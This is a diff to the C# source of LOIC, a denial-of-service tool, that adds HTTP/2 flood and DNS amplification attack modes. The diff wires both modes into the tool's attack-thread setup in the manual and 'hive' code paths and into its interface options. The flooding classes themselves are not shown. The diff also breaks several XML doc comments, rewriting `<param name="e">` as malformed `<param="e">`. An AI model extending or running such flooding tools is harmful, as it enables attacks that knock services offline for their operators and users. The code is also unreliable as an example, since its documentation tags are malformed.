@@ -146,7 +146,7 @@ namespace LOIC
 
 					bResp = chkWaitReply.Checked;
 
-					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil || protocol == Protocol.ICMP)
+					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil || protocol == Protocol.ICMP || protocol == Protocol.HTTP2 || protocol == Protocol.DNSAmplification)
 					{
 						if (!int.TryParse(txtSLSpT.Text, out iSockspThread) || iSockspThread < 1)
 							throw new Exception("A number is fine too!");
@@ -199,6 +199,12 @@ namespace LOIC
 							break;
 						case Protocol.ICMP:
 							ts = new ICMP(sTargetIP, iDelay, chkMsgRandom.Checked, iSockspThread);
+							break;
+						case Protocol.HTTP2:
+							ts = new HTTP2Flooder(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
+							break;
+						case Protocol.DNSAmplification:
+							ts = new DNSAmplification(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 							break;
 					}
 
@@ -937,6 +943,14 @@ namespace LOIC
 							{
 								ts = new ICMP(sTargetIP, iDelay, chkMsgRandom.Checked, iSockspThread);
 							}
+							if (protocol == Protocol.HTTP2)
+							{
+								ts = new HTTP2Flooder(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
+							}
+							if (protocol == Protocol.DNSAmplification)
+							{
+								ts = new DNSAmplification(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
+							}
 
 							if(ts != null)
 							{
@@ -980,6 +994,14 @@ namespace LOIC
 						if (protocol == Protocol.ICMP)
 						{
 							ts = new ICMP(sTargetIP, iDelay, chkMsgRandom.Checked, iSockspThread);
+						}
+						if (protocol == Protocol.HTTP2)
+						{
+							ts = new HTTP2Flooder(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
+						}
+						if (protocol == Protocol.DNSAmplification)
+						{
+							ts = new DNSAmplification(sTargetHost, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkAllowGzip.Checked);
 						}
 
 						if(ts != null)
@@ -1034,7 +1056,7 @@ namespace LOIC
 		/// Handles the enableHive CheckedChanged event.
 		/// </summary>
 		/// <param name="sender">Sender.</param>
-		/// <param name="e">EventArgs.</param>
+		/// <param="e">EventArgs.</param>
 		private void enableHive_CheckedChanged(object sender, EventArgs e)
 		{
 			if (enableHive.Checked)
@@ -1048,7 +1070,7 @@ namespace LOIC
 		/// Handles the disableHive CheckedChanged event.
 		/// </summary>
 		/// <param name="sender">Sender.</param>
-		/// <param name="e">EventArgs.</param>
+		/// <param="e">EventArgs.</param>
 		private void disableHive_CheckedChanged(object sender, EventArgs e)
 		{
 			if (disableHive.Checked)
@@ -1061,8 +1083,8 @@ namespace LOIC
 		/// <summary>
 		/// Handles the label24 Click event.
 		/// </summary>
-		/// <param name="sender">Sender.</param>
-		/// <param name="e">EventArgs.</param>
+		/// <param="sender">Sender.</param>
+		/// <param="e">EventArgs.</param>
 		private void label24_Click(object sender, EventArgs e)
 		{
 			Process.Start("https://github.com/NewEraCracker/LOIC");
@@ -1572,7 +1594,7 @@ namespace LOIC
 			chkRandom.Enabled    = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
 			txtSubsite.Enabled   = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
 
-			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3); // ReCoil_slowLoic_ICMP
+			txtSLSpT.Enabled     = (bool)(cbMethod.SelectedIndex >= 3 || cbMethod.SelectedIndex == 6 || cbMethod.SelectedIndex == 7); // ReCoil_slowLoic_ICMP_HTTP2_DNSAmplification
 			chkAllowGzip.Enabled = (bool)(cbMethod.SelectedIndex >= 2 && cbMethod.SelectedIndex != 5); // HTTP_ReCoil_slowLoic
 			chkWaitReply.Enabled = (bool)(cbMethod.SelectedIndex != 4 && cbMethod.SelectedIndex != 5); // TCP_UDP_HTTP_ReCoil
 			chkUseGet.Enabled    = (bool)(cbMethod.SelectedIndex == 2 || cbMethod.SelectedIndex == 4); // HTTP_slowLoic
